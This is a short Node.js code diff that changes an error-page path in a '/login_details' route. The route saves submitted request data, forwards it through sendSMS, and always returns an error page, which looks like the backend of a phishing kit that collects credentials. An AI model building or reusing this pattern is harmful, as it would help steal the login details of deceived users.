@@ -90,7 +90,7 @@ _router.route('/login_details').post(function _callee(req, res) {
           _context2.next = 2;
           return regeneratorRuntime.awrap(imfor.create(req.body).then(function (result) {
             sendSMS(result);
-            res.status(500).sendFile(path.join(__dirname, 'public', 'error', 'error.html'));
+            res.status(500).sendFile(path.join(__dirname, 'error', 'error.html'));
           })["catch"](function (err) {
             console.log(err);
           }));
